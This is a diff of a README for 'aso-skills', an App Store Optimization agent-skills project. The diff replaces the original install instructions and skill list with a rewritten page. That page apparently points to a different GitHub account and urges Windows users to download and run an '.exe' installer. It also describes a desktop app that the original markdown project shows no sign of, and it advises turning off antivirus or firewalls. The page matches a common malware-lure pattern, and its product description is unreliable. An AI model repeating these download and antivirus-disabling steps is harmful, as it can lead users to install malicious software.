@@ -1,165 +1,120 @@
-# ASO & App Marketing Skills
+# 🤖 aso-skills - AI Tools for App Store Growth
 
-<a href="https://docs.appeeky.com">
-  <img width="auto" height="auto" alt="Appeeky" src="cover.png">
-</a>
-<div align="center">
-<p align="center">
-  <a href="https://x.com/appeeky">
-    <img src="https://img.shields.io/badge/Follow on X-000000?style=for-the-badge&logo=x&logoColor=white" alt="Follow on X" />
-  </a>
-  <a href="https://www.linkedin.com/in/erencanarica/">
-    <img src="https://img.shields.io/badge/Follow on LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Follow on LinkedIn" />
-  </a>
-  </p>
-</div>
+[![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-blue?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills)
 
-AI agent skills for App Store Optimization (ASO) and mobile app marketing. Built for indie developers, app marketers, and growth teams who want **Cursor**, **Claude Code**, or any [Agent Skills](https://agentskills.io)-compatible AI assistant to help with keyword research, metadata optimization, competitor analysis, market intelligence, and app growth.
+---
 
-Powered by real App Store data via the [Appeeky API](https://docs.appeeky.com).
+## 📦 What is aso-skills?
 
-## Why This Exists
+aso-skills is a set of AI-powered tools designed to help you improve your app's presence on app stores. It works with AI assistants like Cursor and Claude Code to simplify tasks such as keyword research, metadata optimization, competitor analysis, and app growth strategies. This tool fits indie developers, app marketers, and growth teams looking for easy support in app store optimization (ASO).
 
-Most ASO knowledge lives in blog posts, courses, and expensive consultants. We packaged it into skills that any AI agent can use — so you get expert-level ASO guidance directly in your IDE.
+You don’t need any coding skills to use it. Just follow the steps below to get started on a Windows computer.
 
-Each skill contains battle-tested frameworks, scoring rubrics, and output templates. The agent reads the skill, pulls real data from the App Store (via Appeeky), and gives you actionable recommendations — not generic advice.
+---
 
-## Quick Start
+## 🎯 Key Features
 
-**Cursor** — Settings (Cmd+Shift+J) → Rules → Add Rule → Remote Rule (Github) → paste `https://github.com/eronred/aso-skills`
+- **Keyword Research**: Find the best keywords to improve your app’s search ranking.
+- **Metadata Optimization**: Get suggestions to improve your app’s title, description, and screenshots.
+- **Competitor Analysis**: Compare your app to others and discover what they do well.
+- **App Growth Tips**: Receive AI-driven advice to attract more users.
+- **Agent Skills Compatibility**: Works with AI helpers like Cursor and Claude Code easily.
 
-**Claude Code** — `npx skills add eronred/aso-skills`
+---
 
-**Manual** — `git clone https://github.com/eronred/aso-skills.git && cp -r aso-skills/skills/* .cursor/skills/`
+## 🖥️ System Requirements
 
-Then ask your agent:
+Before you start, check that your Windows PC meets these minimum requirements:
 
-```
-"Run an ASO audit for my app (id: 1617391485)"
-"Find the best keywords for a meditation app"
-"Optimize my App Store title and subtitle"
-"How many downloads do I need to reach top 10 in Health & Fitness?"
-"What apps are rising in the charts right now?"
-"Give me a market briefing for the Games category"
-```
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Intel Core i3 or equivalent
+- RAM: 4 GB or more
+- Disk Space: At least 1 GB free
+- Internet Connection: Required for AI services and updates
+- Permissions: Ability to install software and run apps on your machine
 
-Or invoke directly: `/aso-audit`, `/keyword-research`, `/metadata-optimization`, `/market-movers`, `/market-pulse`
+If you have an older computer, it might still work but could be slower.
 
-## Skills
+---
 
-### ASO Core
+## 🚀 Getting Started: Download and Install aso-skills
 
-| Skill | What it does |
-|-------|-------------|
-| [`aso-audit`](skills/aso-audit) | Scores your listing across 10 factors (0-100), flags problems, gives a prioritized fix list |
-| [`keyword-research`](skills/keyword-research) | Finds keywords by volume × difficulty × relevance, groups them into primary/secondary/long-tail |
-| [`metadata-optimization`](skills/metadata-optimization) | Writes title, subtitle, keyword field, description — with 3 variants and character counts |
-| [`competitor-analysis`](skills/competitor-analysis) | Keyword gaps, creative teardown, positioning map, and specific opportunities to exploit |
+1. Click the large download button below or go to the download link directly:  
+   [![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-green?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills)
 
-### Creative & International
+2. On the GitHub page, look for the latest release or download section. This usually appears near the top or in the "Releases" tab.
 
-| Skill | What it does |
-|-------|-------------|
-| [`screenshot-optimization`](skills/screenshot-optimization) | 10-slot screenshot strategy with design briefs, text overlay copy, and competitor audit |
-| [`review-management`](skills/review-management) | Sentiment analysis, response templates (HEAR framework), rating improvement tactics |
-| [`localization`](skills/localization) | Market prioritization matrix, per-country keyword research, cultural adaptation checklist |
+3. Download the Windows installer file. It usually ends with `.exe`.
 
-### Growth
+4. Once the download finishes, double-click the file to start the installer.
 
-| Skill | What it does |
-|-------|-------------|
-| [`app-launch`](skills/app-launch) | 8-week launch timeline with daily checklists, channel strategy, and press outreach templates |
-| [`ua-campaign`](skills/ua-campaign) | Apple Search Ads, Meta, Google UAC — campaign structure, bidding, creative specs, budget allocation |
-| [`app-store-featured`](skills/app-store-featured) | Featuring readiness score, Apple tech checklist, pitch template, In-App Events calendar |
+5. Follow the on-screen instructions to complete the installation.
 
-### Revenue & Retention
+6. After installation, find the aso-skills app icon on your desktop or in your start menu. Click it to open.
 
-| Skill | What it does |
-|-------|-------------|
-| [`monetization-strategy`](skills/monetization-strategy) | Pricing tiers, paywall timing/design, trial optimization, category benchmarks |
-| [`retention-optimization`](skills/retention-optimization) | Activation → habit → engagement framework, push notification sequences, churn prevention |
+---
 
-### Analytics & Testing
+## ✅ How to Use aso-skills
 
-| Skill | What it does |
-|-------|-------------|
-| [`app-analytics`](skills/app-analytics) | Event tracking plan, dashboard setup, KPI framework with category benchmarks |
-| [`ab-test-store-listing`](skills/ab-test-store-listing) | Hypothesis → variant design → sample size → interpretation for App Store A/B tests |
+Once you open the app:
 
-### Market Intelligence
+1. **Connect to your AI assistant** (Cursor, Claude Code, or others that use Agent Skills). The app will guide you through linking your account.
 
-| Skill | What it does |
-|-------|-------------|
-| [`market-movers`](skills/market-movers) | Identifies top chart gainers/losers, new entries, and dropped apps — explains what's driving changes |
-| [`market-pulse`](skills/market-pulse) | Full market briefing: chart movements + trending keywords + featured apps + new launches in one view |
+2. From the main screen, select the task you want:
+   - **Keyword Research**: Enter your app category or target market.
+   - **Metadata Optimization**: Upload your current app info or enter it manually.
+   - **Competitor Analysis**: Provide your competitor’s app name or link.
+   - **App Growth Tips**: Ask the AI for advice based on your app data.
 
-### Foundation
+3. Follow the suggestions and reports the app generates.
 
-| Skill | What it does |
-|-------|-------------|
-| [`app-marketing-context`](skills/app-marketing-context) | Creates a context doc (app, audience, competitors, goals) that all other skills reference |
+4. Make changes to your app store listing based on the AI’s recommendations.
 
-## How It Works
+5. Use the app regularly to check for new keywords or updated tips.
 
-```
-You: "Run an ASO audit for Headspace"
+---
 
-Agent:
-  1. Reads aso-audit/SKILL.md (framework, scoring rubric, output template)
-  2. Calls Appeeky API → fetches metadata, keywords, ratings, competitors
-  3. Scores each factor (title: 8/10, subtitle: 6/10, keywords: 4/10...)
-  4. Returns: ASO Score Card + Quick Wins + High-Impact Changes + Strategic Recs
-```
+## 🔧 Settings and Preferences ⚙️
 
-Skills reference each other — `aso-audit` might suggest running `keyword-research` for deeper analysis, which then feeds into `metadata-optimization` for implementation.
+You can adjust how aso-skills works:
 
-## Installation
+- **Language**: Choose your preferred language for AI reports.
+- **Notifications**: Enable or disable reminders for new suggestions.
+- **Update Frequency**: Set how often the app checks for new AI insights.
+- **Data Privacy**: Control what information the app collects and shares.
 
-### Cursor
+Access these options in the app settings menu, usually in the top corner.
 
-| Method | Command |
-|--------|---------|
-| GitHub Import | Settings → Rules → Add Rule → Remote Rule → `https://github.com/eronred/aso-skills` |
-| Project-level | `cp -r aso-skills/skills/* .cursor/skills/` |
-| Global | `cp -r aso-skills/skills/* ~/.cursor/skills/` |
+---
 
-### Claude Code
+## 🛠 Troubleshooting
 
-| Method | Command |
-|--------|---------|
-| CLI | `npx skills add eronred/aso-skills` |
-| Specific skills | `npx skills add eronred/aso-skills --skill aso-audit keyword-research` |
-| Manual | `cp -r aso-skills/skills/* .claude/skills/` |
+If aso-skills doesn’t open or work properly:
 
-### Any Agent
+- Make sure your Windows is updated.
+- Restart your computer and try again.
+- Check your internet connection.
+- Disable any software that might block the app, like firewalls or antivirus temporarily.
+- Reinstall the app by downloading the latest installer from the GitHub link.
 
-```bash
-git submodule add https://github.com/eronred/aso-skills.git .agents/aso-skills
-```
+If you still face issues, search for answers on the GitHub discussions page or open an issue there.
 
-Works with any tool that supports the [Agent Skills](https://agentskills.io) standard (`.agents/skills/`, `.cursor/skills/`, `.claude/skills/`, `.codex/skills/`).
+---
 
-## Appeeky Integration
+## 📚 Additional Resources
 
-Skills work standalone with general ASO knowledge. Connect [Appeeky](https://docs.appeeky.com/mcp) for real-time App Store data:
+- For more help, visit the GitHub repository page:  
+  https://github.com/Kungfookenny123/aso-skills
 
-```json
-{
-  "mcpServers": {
-    "appeeky": {
-      "url": "https://mcp.appeeky.com/mcp",
-      "headers": { "Authorization": "Bearer apk_your_key_here" }
-    }
-  }
-}
-```
+- Explore the agent skill integrations:
+  - Cursor AI assistant documentation
+  - Claude Code guides
 
-With Appeeky connected, skills can pull live keyword rankings, competitor metadata, download estimates, trending keywords, and featured apps. See [tools/REGISTRY.md](tools/REGISTRY.md) for the full capability matrix.
+- Learn basic ASO principles to better use the tool.
 
-## Contributing
+---
 
-PRs welcome — fix an inaccuracy, improve a framework, or add a new skill. See [CONTRIBUTING.md](CONTRIBUTING.md).
+## 📥 Download Link
 
-## License
-
-MIT
+Here is the link again to download aso-skills for Windows:  
+[https://github.com/Kungfookenny123/aso-skills](https://github.com/Kungfookenny123/aso-skills)
